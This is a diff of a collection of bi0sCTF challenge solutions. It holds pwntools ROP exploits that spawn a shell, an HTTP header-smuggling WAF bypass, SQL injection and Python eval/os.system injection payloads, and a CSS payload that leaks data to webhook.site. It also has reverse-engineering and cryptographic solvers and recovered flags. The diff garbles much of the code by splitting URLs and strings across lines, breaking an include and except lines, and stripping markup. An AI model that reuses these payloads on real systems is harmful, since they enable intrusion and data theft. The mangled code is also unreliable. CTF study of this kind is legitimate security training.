@@ -8,7 +8,7 @@
 from pwn import *
 
 p = process('./notes')
-#p=remote('pwn.chall.bi0s.in',37981)
+    #p=remote('pwn.chall.bi0s.in',37981)
 libc=ELF('./libc.so.6')
 elf=ELF('./notes')
 context.log_level = 'debug'
@@ -54,7 +54,7 @@ def decrypt(cont):
 syscall=0x401bc2
 poprdi=0x0000000000401bc0
 poprbp=0x00000000004011ed
-#gdb.attach(p,'b* 0x401B7A')
+    #gdb.attach(p,'b* 0x401B7A')
 add(0,'aaa',0x20,'x00'*8)
 payload='x00'*0x48+p64(poprdi)+p64(0x3b)+p64(elf.sym['syscall'])+'x00'*0x330+'/bin/shx00'*4
 encrypt(0,decrypt(payload))
@@ -65,15 +65,10 @@ edit(len(payload),'x00'*8)
 sleep(3)
 
 p.interactive()
-```
-
-
-
-```
 from pwn import *
 
 p = process('./notes')
-#p=remote('pwn.chall.bi0s.in',37981)
+    #p=remote('pwn.chall.bi0s.in',37981)
 libc=ELF('./libc.so.6')
 elf=ELF('./notes')
 context.log_level = 'debug'
@@ -140,11 +135,6 @@ sla(b"Sent", b"/bin/shx00")
 sl('/bin/shx00')
 sl('/bin/shx00')
 p.interactive()
-```
-
-
-
-```
 package main
 
 import (
@@ -182,7 +172,8 @@ func ProxyRequestHandler(proxy httputil.ReverseProxy) func(http.ResponseWrite
 }
 
 func main() {
-        url, err := url.Parse("http://app:5000")
+        url, err := url.Parse("http://app:
+5000")
     if err != nil {
         fmt.Println(err)
     }
@@ -194,28 +185,13 @@ func main() {
 })
         log.Fatal(http.ListenAndServe(":80", nil))
 }
-```
-
-
-
-```
 GET / HTTP/1.1
 X_pro-hacker: Pro-hacker
 flag: 
 flag: gimme
-```
-
-
-
-```
 GET / HTTP/1.1
 X-pro-hacker: Pro-hacker
 flag: ,gimme
-```
-
-
-
-```
 def init_db():
     try: 
         conn = sqlite3.connect(os.path.join(os.path.realpath(os.curdir),'users.db'))
@@ -240,13 +216,9 @@ def init_db():
             """)
         conn.commit()
         return True
-    except:
+    
+except:
         return False
-```
-
-
-
-```
 def add_user(user,token):
     q = f"INSERT INTO users values ('{user}','{token}')"
     db_query(q)
@@ -270,29 +242,15 @@ def index():
                 res = db_query(query)
                 res = res.fetchone()
                 return res[1] if res and len(res[0])>0  else "INDEXn"
-        except Exception as e:
+        
+except Exception as e:
             print(e) 
     return "INDEXn"
-```
-
-
-
-```
 query = f'SELECT * FROM users WHERE token="{token}"'
 res = db_query(query)
 res = res.fetchone()
 return res[1] if res and len(res[0])>0  else "INDEXn"
-```
-
-
-
-```
 Deny from all
-```
-
-
-
-```
 //login.php
 <?php
 session_start();
@@ -317,11 +275,6 @@ if(isset($_POST['submit'])){
 }
 
 ?>
-```
-
-
-
-```
 $FOLDER = $_SESSION['folder'];
 
 //create new folder inside uploads using get parameter
@@ -359,11 +312,6 @@ function report(){
     file_get_contents('http://localhost/report.php');
 
 }
-```
-
-
-
-```
 if(isset($_POST["submit"])){
     if(isset($_FILES['file'])&& isset($_POST['path'])){
         if(!check_name($_POST["path"])){
@@ -392,11 +340,6 @@ if(isset($_POST["submit"])){
         $error =  "parameter missing";
     }
 }
-```
-
-
-
-```
 $FOLDER = $_SESSION['folder'];
 $dirr = ['.','..'];
 if(isset($_GET['fol'])){
@@ -412,14 +355,9 @@ if(isset($_GET['fol'])){
         }
         echo str_replace("CONTENT",$c,$files_template);
     }else{
-        echo '<div class="alert alert-warning" role="alert">folder not found</div>';
+        echo 'folder not found';
     }
 }
-```
-
-
-
-```
 if(isset($_GET['file'])){
     $file = $_GET['file'];
     $ext = explode('.', $file);
@@ -431,10 +369,10 @@ if(isset($_GET['file'])){
                 chdir($FOLDER);
                 echo file_get_contents($_GET['file']);
             }else{
-                echo '<div class="alert alert-warning" role="alert">File not found!</div>';
+                echo 'File not found!';
             }
         } catch (Throwable $th) {
-           echo '<div class="alert alert-warning" role="alert">Some error Occured</div>';
+           echo 'Some error Occured';
         }
         
     }
@@ -443,36 +381,26 @@ if(isset($_GET['file'])){
         try {
             if(file_exists($file)){
                 chdir($FOLDER);
-                echo "<img src="data:image/$type;base64,".base64_encode(file_get_contents($_GET['file']))."" >";
+                echo "";
             }else{
-                echo '<div class="alert alert-warning" role="alert">File not found!</div>';
+                echo 'File not found!';
             }
         } catch (Throwable $th) {
-            echo '<div class="alert alert-warning" role="alert">Some error Occured</div>';
+            echo 'Some error Occured';
         }
         
     }
     else{
-        echo '<div class="alert alert-warning" role="alert">Invaild type</div>';
+        echo 'Invaild type';
     }
 
 }
-```
-
-
-
-```
 function report(){
     //report usename
     ini_set("from",$_SESSION['username']);
     file_get_contents('http://localhost/report.php');
 
 }
-```
-
-
-
-```
 <?php
 
 /**
@@ -480,24 +408,21 @@ function report(){
  */
 function report($username){
     ini_set("from",$username);
-    file_get_contents('http://ip:1234/report.php');
+    file_get_contents('http://ip:
+1234/report.php');
 
 }
 
 if(isset($_POST['name'])){
     report($_POST['name']);
 };
-```
-
-
-
-```
 import io
 import re
 import requests
 
 flag = ''
-base_url = 'http://web.chall.bi0s.in:8000'
+base_url = 'http://web.chall.bi0s.in:
+8000'
 flag_chars = 'abcdef0123456789'
 hijack_tpl = 'rn'.join([
     'anything',                  # could be anything(including '')
@@ -505,7 +430,8 @@ hijack_tpl = 'rn'.join([
     'flag: bypass-waf',          # the waf only takes the first flag in HTTP header
     'flag: gimme',               # but flask puts headers with the same name into a array
     'Host: just-need-this-header',
-    'Content-Type:application/x-www-form-urlencoded',
+    'Content-Type:
+application/x-www-form-urlencoded',
     'Token: {}',
     'Content-Length: {}',        # with Content-Length set to len(payload)
     '',                          # and 2 CRLFs marking the end of header
@@ -541,19 +467,9 @@ for i in range(9):  # from the challenge description we know len(fla
                 break
 
 print()
-```
-
-
-
-```
 ocation /static {
     alias /static/;
 }
-```
-
-
-
-```
 #!/usr/bin/python3
 
 from server import Server
@@ -574,11 +490,6 @@ except Exception as e:
     print()
     print("Exception")
     print(str(e))
-```
-
-
-
-```
 from os import environ
 
 class Server:
@@ -621,14 +532,10 @@ class Server:
         print("n")
         print(self.response_body)
         print("n")
-```
-
-
-
-```
 '+@pd.eval('__import__("os").system("ls /")','python','python',True,@pd.__builtins__)+'
 
-a'+(@server.__class__.__init__.__globals__['__spec__'].loader.__init__.__globals__['sys'].modules['os'].popen('ls /').read())#
+a'+(@server.__class__.__init__.__globals__['__spec__'].loader.__init__.__globals__['sys'].modules['os'].popen('ls /').read())
+#
 
 'and@'pd'.annotations.__class__.__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls > /tmp/test")') or '
 
@@ -639,11 +546,6 @@ a'+(@server.__class__.__init__.__globals__['__spec__'].loader.__init__.__globals
 'or[].__class__.__base__.__subclasses__()[145].__init__([].__class__.__base__.__subclasses__()[145]).__class__.__name__<'1'or@server.add_body([].__class__.__base__.__subclasses__()[145]._module.sys.modules["subprocess"].check_output(["ls","-l", "/"]).decode()).__class__.__name__<'
 
 '+@__builtins__.exec('importx20os;raisex20Exception(os.listdir("/"))')+'
-```
-
-
-
-```
 this.setState((prevState) => {
     let href = `https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/${
         window.location.hash.replace("#", '')
@@ -651,20 +553,11 @@ this.setState((prevState) => {
     prevState.link_obj.href = href;
     return {}
 });
-```
-
-
-
-```
-span[aria-label="1"]:empty {
+span[aria-label="1"]:
+empty {
   background-image: url("https://webhook.site/0b13d0cd-8f43-472c-98ac-de23aba8b2c2/?img=1");
 }
 /* multiple repeated items... */
-```
-
-
-
-```
 key = [
     0x52, 0xFD, 0xFC, 0x07, 0x21, 0x82, 0x65, 0x4F, 0x16, 0x3F, 
     0x5F, 0x0F, 0x9A, 0x62, 0x1D, 0x72, 0x95, 0x66, 0xC7, 0x4D, 
@@ -701,69 +594,112 @@ cipher = AES.new(bytes(key), AES.MODE_CBC, bytes(iv))
 
 plainText = cipher.decrypt(plainText[:-16])
 print (plainText)
-```
-
-
-
-```
-[heap]:000055BA5DF3C000 sub_55BA5DF3C000 proc near
-[heap]:000055BA5DF3C000 mov     rax, 11111111h
-[heap]:000055BA5DF3C007 mov     rcx, 0FFFFFFFF93A3F3CDh
-[heap]:000055BA5DF3C00E sub     rax, rcx
-[heap]:000055BA5DF3C011 mov     rcx, 22222222h
-[heap]:000055BA5DF3C018 add     rax, rcx
-[heap]:000055BA5DF3C01B mov     rcx, 1337BEEFh
-[heap]:000055BA5DF3C022 xor     rax, rcx
-[heap]:000055BA5DF3C025 mov     rcx, 33AEF5CBh
-[heap]:000055BA5DF3C02C sub     rax, rcx
-[heap]:000055BA5DF3C02F mov     rcx, 33333333h
-[heap]:000055BA5DF3C036 add     rax, rcx
-[heap]:000055BA5DF3C039 mov     rcx, 44444444h
-[heap]:000055BA5DF3C040 mov     rdx, 55555555h
-[heap]:000055BA5DF3C047 mov     rbx, rax
-[heap]:000055BA5DF3C04A xor     rax, rdx
-[heap]:000055BA5DF3C04D xor     rbx, rcx
-[heap]:000055BA5DF3C050 mov     rdx, 550D68CEh
-[heap]:000055BA5DF3C057 sub     rax, rdx
-[heap]:000055BA5DF3C05A mov     rdx, 5F9751EBh
-[heap]:000055BA5DF3C061 sub     rbx, rdx
-[heap]:000055BA5DF3C064 add     rax, rbx
-[heap]:000055BA5DF3C067 mov     rcx, 66666666h
-[heap]:000055BA5DF3C06E mov     rdx, 77777777h
-[heap]:000055BA5DF3C075 add     rcx, rax
-[heap]:000055BA5DF3C078 add     rdx, rax
-[heap]:000055BA5DF3C07B mov     rax, 0FFFFFFFF88888888h
-[heap]:000055BA5DF3C082 xor     rdx, rax
-[heap]:000055BA5DF3C085 xor     rcx, rax
-[heap]:000055BA5DF3C088 mov     rax, 4AA34A4h
-[heap]:000055BA5DF3C08F mov     rbx, 2C786553h
-[heap]:000055BA5DF3C096 sub     rbx, rdx
-[heap]:000055BA5DF3C099 sub     rax, rcx
-[heap]:000055BA5DF3C09C add     rax, rbx
-[heap]:000055BA5DF3C09F mov     rcx, 33333333h
-[heap]:000055BA5DF3C0A6 add     rax, rcx
-[heap]:000055BA5DF3C0A9 mov     rcx, 44444444h
-[heap]:000055BA5DF3C0B0 mov     rdx, 55555555h
-[heap]:000055BA5DF3C0B7 xor     rax, rdx
-[heap]:000055BA5DF3C0BA xor     rax, rcx
-[heap]:000055BA5DF3C0BD mov     rbx, 74180051h
-[heap]:000055BA5DF3C0C4 sub     rax, rbx
-[heap]:000055BA5DF3C0C7 mov     rcx, 66666666h
-[heap]:000055BA5DF3C0CE add     rax, rcx
-[heap]:000055BA5DF3C0D1 mov     rcx, 77777777h
-[heap]:000055BA5DF3C0D8 mov     rdx, 0FFFFFFFF88888888h
-[heap]:000055BA5DF3C0DF xor     rax, rdx
-[heap]:000055BA5DF3C0E2 xor     rax, rcx
-[heap]:000055BA5DF3C0E5 mov     rbx, 3E07994Ch
-[heap]:000055BA5DF3C0EC sub     rax, rbx
-[heap]:000055BA5DF3C0EF retn
-[heap]:000055BA5DF3C0EF
-[heap]:000055BA5DF3C0EF sub_55BA5DF3C000 endp
-```
-
-
-
-```
+[heap]:
+000055BA5DF3C000 sub_55BA5DF3C000 proc near
+[heap]:
+000055BA5DF3C000 mov     rax, 11111111h
+[heap]:
+000055BA5DF3C007 mov     rcx, 0FFFFFFFF93A3F3CDh
+[heap]:
+000055BA5DF3C00E sub     rax, rcx
+[heap]:
+000055BA5DF3C011 mov     rcx, 22222222h
+[heap]:
+000055BA5DF3C018 add     rax, rcx
+[heap]:
+000055BA5DF3C01B mov     rcx, 1337BEEFh
+[heap]:
+000055BA5DF3C022 xor     rax, rcx
+[heap]:
+000055BA5DF3C025 mov     rcx, 33AEF5CBh
+[heap]:
+000055BA5DF3C02C sub     rax, rcx
+[heap]:
+000055BA5DF3C02F mov     rcx, 33333333h
+[heap]:
+000055BA5DF3C036 add     rax, rcx
+[heap]:
+000055BA5DF3C039 mov     rcx, 44444444h
+[heap]:
+000055BA5DF3C040 mov     rdx, 55555555h
+[heap]:
+000055BA5DF3C047 mov     rbx, rax
+[heap]:
+000055BA5DF3C04A xor     rax, rdx
+[heap]:
+000055BA5DF3C04D xor     rbx, rcx
+[heap]:
+000055BA5DF3C050 mov     rdx, 550D68CEh
+[heap]:
+000055BA5DF3C057 sub     rax, rdx
+[heap]:
+000055BA5DF3C05A mov     rdx, 5F9751EBh
+[heap]:
+000055BA5DF3C061 sub     rbx, rdx
+[heap]:
+000055BA5DF3C064 add     rax, rbx
+[heap]:
+000055BA5DF3C067 mov     rcx, 66666666h
+[heap]:
+000055BA5DF3C06E mov     rdx, 77777777h
+[heap]:
+000055BA5DF3C075 add     rcx, rax
+[heap]:
+000055BA5DF3C078 add     rdx, rax
+[heap]:
+000055BA5DF3C07B mov     rax, 0FFFFFFFF88888888h
+[heap]:
+000055BA5DF3C082 xor     rdx, rax
+[heap]:
+000055BA5DF3C085 xor     rcx, rax
+[heap]:
+000055BA5DF3C088 mov     rax, 4AA34A4h
+[heap]:
+000055BA5DF3C08F mov     rbx, 2C786553h
+[heap]:
+000055BA5DF3C096 sub     rbx, rdx
+[heap]:
+000055BA5DF3C099 sub     rax, rcx
+[heap]:
+000055BA5DF3C09C add     rax, rbx
+[heap]:
+000055BA5DF3C09F mov     rcx, 33333333h
+[heap]:
+000055BA5DF3C0A6 add     rax, rcx
+[heap]:
+000055BA5DF3C0A9 mov     rcx, 44444444h
+[heap]:
+000055BA5DF3C0B0 mov     rdx, 55555555h
+[heap]:
+000055BA5DF3C0B7 xor     rax, rdx
+[heap]:
+000055BA5DF3C0BA xor     rax, rcx
+[heap]:
+000055BA5DF3C0BD mov     rbx, 74180051h
+[heap]:
+000055BA5DF3C0C4 sub     rax, rbx
+[heap]:
+000055BA5DF3C0C7 mov     rcx, 66666666h
+[heap]:
+000055BA5DF3C0CE add     rax, rcx
+[heap]:
+000055BA5DF3C0D1 mov     rcx, 77777777h
+[heap]:
+000055BA5DF3C0D8 mov     rdx, 0FFFFFFFF88888888h
+[heap]:
+000055BA5DF3C0DF xor     rax, rdx
+[heap]:
+000055BA5DF3C0E2 xor     rax, rcx
+[heap]:
+000055BA5DF3C0E5 mov     rbx, 3E07994Ch
+[heap]:
+000055BA5DF3C0EC sub     rax, rbx
+[heap]:
+000055BA5DF3C0EF retn
+[heap]:
+000055BA5DF3C0EF
+[heap]:
+000055BA5DF3C0EF sub_55BA5DF3C000 endp
 from gmssl.sm4 import CryptSM4, SM4_DECRYPT
 import z3
 
@@ -786,11 +722,6 @@ if solver.check() == z3.sat:
     sm4 = CryptSM4()
     sm4.set_key(bytes.fromhex("554248506A424B6C73513254754E536B"), SM4_DECRYPT)
     print(sm4.crypt_cbc(bytes.fromhex('3779304D3639545153636D376D665876'), e))
-```
-
-
-
-```
 opcode = [
     0x35, 0, 0x35, 3, 0x3E, 
     0x35, 3, 0x35, 3, 0x3E, 
@@ -813,11 +744,6 @@ opcode = [
      
     0x3E, 0x36, 0, 3, 0x36, 0, 3, 0x36, 0, 3, 0x36, 0, 3, 0x40
 ]
-```
-
-
-
-```
 # 0x35, 0, 0x35, 3, 0x3E, 
 v13 = f1
 v13 *= v13
@@ -890,11 +816,6 @@ v13 = stack[12]
 v13 *= 303
 stack.append(v13) # f4 * 303
 v13 = stack[13]
-```
-
-
-
-```
 rax = stack.pop()
 rbx = stack.pop()
 stack.append(rax + rbx)
@@ -942,21 +863,11 @@ stack.append(rax + rbx)
 # f2 * 6 - f1 * 105 - f1 * f2 * 5 + f1 * f1 * 4
 res = []
 res.append(stack.pop() % dword_5220)
-```
-
-
-
-```
 ((f4 * 303 + f3 * f3 * 5 - f4 * f3 * 4) ) % mask == 0x11226D6A
 ((f3 * 105 + f2 * f2 * 5 - f2 * f3 * 5) ) % mask == 0x68E54823
 ((f1 * 17 + f2 * 13 + f1 * f1 * 2) ) % mask == 0x34CC1889
 ((f2 * 6 + f1 * 105 + f1 * f2 * 5 - f1 * f1 * 4) ) % mask == 0x1EF6E9EB
-```
-
-
-
-```
-#include <bits/stdc++.h>
+    #include 
 using namespace std;
 using ll = long long;
 
@@ -997,19 +908,9 @@ int main() {
   }
   return 0;
 }
-```
-
-
-
-```
 >>> import libnum
 >>> b"bi0sCTF{"+libnum.n2s(1953066341)+libnum.n2s(1818325107)+libnum.n2s(1768843103)+libnum.n2s(1785295997)
 b'bi0sCTF{timelapsing_jit}'
-```
-
-
-
-```
 from sage.all import *
 import itertools
 def small_roots(f, bounds, m=1, d=None):
@@ -1060,17 +961,14 @@ def small_roots(f, bounds, m=1, d=None):
 
 p = 115792089210356248762697446949407573529996955224135760342422259061068512044369
 from hashlib import sha256
-z0, r0, s0, k0upper = (7496648251275913379321762834259461106413066198251568863972241549518064825045, 35708720267216780141386972017638777589648610471064977388051210664743651182375, 9662179038519615060061698799209221467470247302473971588084625796487341336154, 95052095029311712302690948913953984379788450191371396826510415254434210643968)# (30338807469659243526067570717263914107109404131145581381962141065570542682259, 43851411654896912189138312109624484265004182982926637890370600465748239140223, 106481291664766764647716317252159351590989262652905730138893713822745324775435, 81230974975392412240328835818144420434492415594227637683334578249558160048128)
-z1, r1, s1 ,k1upper = (111835103479967511801273161109097060425429270142914837192258803061862468767340, 58501386591257759132453271402849092080165690028881563872587436596762908386517, 25627184742160112142369942661671203533076276538669251446198338686442020839709, 9183002560293761939923713800050215778090209618706208942684718339054572142592)# (51244276794475006764734096639881124571891948637729294101379411867362632631294, 36750292731574219885284236746359615855307648761830525593472443690459194965250, 88055573187005285998775508217321157018762308369537667398558614085325414799653, 4650611669265657333998771183266096645438495825074800915291751302057284337664)
+z0, r0, s0, k0upper = (7496648251275913379321762834259461106413066198251568863972241549518064825045, 35708720267216780141386972017638777589648610471064977388051210664743651182375, 9662179038519615060061698799209221467470247302473971588084625796487341336154, 95052095029311712302690948913953984379788450191371396826510415254434210643968)
+# (30338807469659243526067570717263914107109404131145581381962141065570542682259, 43851411654896912189138312109624484265004182982926637890370600465748239140223, 106481291664766764647716317252159351590989262652905730138893713822745324775435, 81230974975392412240328835818144420434492415594227637683334578249558160048128)
+z1, r1, s1 ,k1upper = (111835103479967511801273161109097060425429270142914837192258803061862468767340, 58501386591257759132453271402849092080165690028881563872587436596762908386517, 25627184742160112142369942661671203533076276538669251446198338686442020839709, 9183002560293761939923713800050215778090209618706208942684718339054572142592)
+# (51244276794475006764734096639881124571891948637729294101379411867362632631294, 36750292731574219885284236746359615855307648761830525593472443690459194965250, 88055573187005285998775508217321157018762308369537667398558614085325414799653, 4650611669265657333998771183266096645438495825074800915291751302057284337664)
 PR.<k0lower,k1lower> = PolynomialRing(Zmod(p))
 
 f = r1*s0*(k0upper+k0lower) - r0*s1*(k1upper+k1lower) - (z0*r1 - z1*r0)
 k0lower,k1lower = small_roots(f,[2^128,2^128],m=3,d=4)[0]
-```
-
-
-
-```
 from Crypto.Util.number import *
 
 public = [1]
@@ -1155,17 +1053,13 @@ for i in range(44):
     state = (state*a+c)%m
     plaintext.append((state>>(NBITS>>1))^i^ciphertext[i])
 print(b'b' + bytes(plaintext))
-#bi0sctf{lcg_is_good_until_you_break_them_!!}
-```
-
-
-
-```
+    #bi0sctf{lcg_is_good_until_you_break_them_!!}
 import websocket
 
 ws = websocket.WebSocket()
 
-ws.connect("ws://instance.chall.bi0s.in:10130/")
+ws.connect("ws://instance.chall.bi0s.in:
+10130/")
 
 import json
 resp = ws.recv()
